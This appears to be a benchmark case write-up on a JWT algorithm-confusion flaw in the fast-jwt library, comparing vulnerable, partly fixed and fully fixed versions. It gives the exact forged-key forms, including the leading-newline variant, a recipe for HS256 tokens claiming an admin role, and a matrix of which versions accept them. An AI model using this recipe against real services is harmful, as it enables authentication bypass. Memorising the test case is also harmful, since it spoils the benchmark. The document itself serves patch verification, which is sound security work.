================================================================================
PatchClosure-Bench case: fast-jwt-cve-2026-34950
JWT algorithm confusion / signature-verification bypass (CWE-347)
CVE-2023-48223 (V1 = 3.3.2, incomplete fix = TARGET) -> CVE-2026-34950 (V2 = 6.2.0, complete fix)
V0 = 3.3.1 (pre-CVE-2023-48223). Gate run 2026-07-13 on real Docker (node:20-slim).
Variant A (same sink = src/crypto.js key classification; same flag channel = admin route).
================================================================================

--------------------------------------------------------------------------------
1. EXACT SINK CODE (src/crypto.js), verbatim from the release tags
--------------------------------------------------------------------------------
V0  v3.3.1  performDetectPublicKeyAlgorithms:
    const publicKeyPemMatcher = '-----BEGIN PUBLIC KEY-----'          // a STRING
    ...
    } else if (!key.includes(publicKeyPemMatcher) && !key.includes(publicKeyX509CertMatcher)) {
      // Not a PEM, assume a plain secret
      return hsAlgorithms
    }
  => A PKCS1 public key header "-----BEGIN RSA PUBLIC KEY-----" does NOT contain the
     substring "-----BEGIN PUBLIC KEY-----" (the "RSA " breaks it) -> misclassified as HMAC.
     This is CVE-2023-48223.

V1  v3.3.2  (fix commit 15a6e92 — replaces .includes() with a regex):
    const publicKeyPemMatcher = /^-----BEGIN( RSA)? PUBLIC KEY-----/   // now matches PKCS1
    ...
    } else if (!key.match(publicKeyPemMatcher) && !key.includes(publicKeyX509CertMatcher)) {
      // Not a PEM, assume a plain secret
      return hsAlgorithms
    }
  => Regex now catches "-----BEGIN RSA PUBLIC KEY-----", BUT it is ^-anchored and the
     public-key path does NOT .trim() the key (the private-key path DOES: key.trim().match(...)).
     A LEADING newline defeats ^ -> match is null -> still misclassified as HMAC.
     This is CVE-2026-34950 (GHSA-mvf2-f6gm-w987): "incomplete fix ... defeated by any leading
     whitespace ... This inconsistency [priv trims, pub does not] is the root cause."

V2  v6.2.0  performDetectPublicKeyAlgorithms (complete fix):
    const trimmedKey = key.trim()
    const publicKeyPemMatch = trimmedKey.match(publicKeyPemMatcher)
    if (trimmedKey.match(privateKeyPemMatcher)) { throw ... }
    else if (publicKeyPemMatch && publicKeyPemMatch[1] === 'RSA') { return rsaAlgorithms }
    else if (!publicKeyPemMatch && !trimmedKey.includes(publicKeyX509CertMatcher)) { return hsAlgorithms }
  => key.trim() strips the leading whitespace BEFORE matching -> classified as RSA public key
     -> HS256 forgery rejected. Closes both the original and the whitespace variant.

Verifier path (verifier.js): with a static key and NO explicit `algorithms` option,
allowedAlgorithms = detectPublicKeyAlgorithms(key). If that returns hsAlgorithms, an HS256
token whose HMAC secret == the (public) key STRING verifies. This is the classic algorithm
confusion; the app deliberately omits `algorithms` (realistic vulnerable config).

--------------------------------------------------------------------------------
2. EXACT FORGED-KEY FORMS (attacker HMAC secret = the server's RSA PUBLIC key string)
--------------------------------------------------------------------------------
ORIGINAL (CVE-2023-48223) : secret = PUB
                            PUB = "-----BEGIN RSA PUBLIC KEY-----\n...\n-----END RSA PUBLIC KEY-----\n"
                            (PKCS1, NO leading whitespace) -> route /admin  (verifier key = PUB)
RESIDUAL (CVE-2026-34950) : secret = "\n" + PUB
                            (identical key, one LEADING newline; per GHSA PoC "'\n' + publicKeyPem",
                             a database-retrieved key) -> route /admin-tainted (verifier key = "\n"+PUB)
Token = base64url({"alg":"HS256","typ":"JWT"}) . base64url({"sub":"attacker","role":"admin"}) . HMAC-SHA256(secret, signing_input)

--------------------------------------------------------------------------------
3. ISOLATED CLASSIFICATION MATRIX (docker compose exec <ver> node -e ...; fresh PKCS1 key per run)
   Directly probes fast-jwt's key classification, independent of HTTP/Express.
--------------------------------------------------------------------------------
fast-jwt 3.3.1  clean PKCS1     -> HS256 ACCEPTED as HMAC (role=admin)   [CONFUSION OPEN]
fast-jwt 3.3.1  tainted \n+PKCS1 -> HS256 ACCEPTED as HMAC (role=admin)  [CONFUSION OPEN]
fast-jwt 3.3.2  clean PKCS1     -> REJECTED (Unsupported PEM public key.) [CONFUSION CLOSED]  <- CVE-2023-48223 fix
fast-jwt 3.3.2  tainted \n+PKCS1 -> HS256 ACCEPTED as HMAC (role=admin)  [CONFUSION OPEN]     <- RESIDUAL (CVE-2026-34950)
fast-jwt 6.2.0  clean PKCS1     -> REJECTED (The token algorithm is invalid.) [CONFUSION CLOSED]
fast-jwt 6.2.0  tainted \n+PKCS1 -> REJECTED (The token algorithm is invalid.) [CONFUSION CLOSED] <- CVE-2026-34950 fix

NOTE on the V1 clean rejection ("Unsupported PEM public key"): this is a DIRECT CONSEQUENCE of
the CVE-2023-48223 fix. In 3.3.1 the PKCS1 header went to the HMAC branch (forgery works); in
3.3.2 the new regex matches it and routes it to the PUBLIC-KEY branch (the fix) — 3.3.2's public
loader then rejects the PKCS1 encoding. Either way the forged HS256 token no longer verifies:
the fix reclassifies the key away from HMAC. The security outcome (HS256 forgery rejected) is the
point. The residual (tainted) row is unaffected by this quirk — it verifies as HMAC on V1.

